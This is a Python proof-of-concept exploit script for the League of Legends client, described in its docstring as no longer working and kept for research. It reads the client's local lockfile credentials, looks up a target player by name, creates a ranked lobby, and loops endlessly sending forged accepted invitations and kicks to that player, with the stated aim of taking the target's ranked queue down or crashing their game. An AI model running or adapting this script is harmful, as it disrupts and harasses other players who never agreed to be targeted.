import json, requests, time
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

"""
~ not working anymore, I'll only keep it here for research purposes
xpl file related to the first PoC available for a bug present in League of Legends, discovered by me, which could lead to remote game crashing
"""

def getsummonerid(summonnername):
	data = lcureq('/lol-summoner/v1/summoners?name=%s'%(summonnername))
	data = json.loads(data)
	return data

def lcureq(reqendpoint, reqmethod='get', reqdata=''):
	if reqmethod.upper() == 'POST': ##post method
		return session.post(lcu_endpoint+reqendpoint, data=reqdata, verify=False, auth=(lcuuser, lcupass)).text
	elif reqmethod.upper() == 'GET':  ##get method
		return session.get(lcu_endpoint+reqendpoint, verify=False, auth=(lcuuser, lcupass)).text
	elif reqmethod.upper() == 'DELETE':
		return session.delete(lcu_endpoint+reqendpoint, verify=False, auth=(lcuuser, lcupass)).text

lcurawdata = open('C:\\Riot Games\\League of Legends\\lockfile').read()
lcuuser = 'riot'
lcuport = str(lcurawdata.split(':')[2])
lcupass = str(lcurawdata.split(':')[3])
lcumethod = str(lcurawdata.split(':')[4])
lcu_endpoint = '{method}://127.0.0.1:{port}'.format(method=lcumethod, port=lcuport)

session = requests.Session()

sumname = str(input("Summoners Target Name: ")).strip()

sumid = getsummonerid(sumname)['summonerId']

## CREATE LOBBY GAME --RANKED-- ##
lobbycreatedata = '{"allowablePremadeSizes":[1,2],"customLobbyName":"","customMutatorName":"","customRewardsDisabledReasons":[],"customSpectatorPolicy":"NotAllowed","customSpectators":[],"customTeam100":[],"customTeam200":[],"gameMode":"CLASSIC","isCustom":false,"isLobbyFull":false,"isTeamBuilderManaged":false,"mapId":11,"maxHumanPlayers":0,"maxLobbySize":2,"maxTeamSize":5,"pickType":"","premadeSizeAllowed":true,"queueId":420,"showPositionSelector":true}'
lcureq('/lol-lobby/v2/lobby', 'post', reqdata=lobbycreatedata)

#['Requested', 'Pending', 'Accepted', 'Joined', 'Declined', 'Kicked', 'OnHold', 'Error']

print ('[+] Taking %s\'s ranked queue down..'%(sumname))
print ('[+] Triggering the xpl...')

while 1:
	try:
		lcureq('/lol-lobby/v2/lobby/invitations', 'post', reqdata='[{"state":"Accepted","toSummonerId":%d,"toSummonerName":"%s"}]'%(int(sumid), str(sumname)))
		lcureq('/lol-lobby/v2/lobby/members/{}/kick'.format(sumid), 'post')
	except KeyboardInterrupt:
		exit(1)
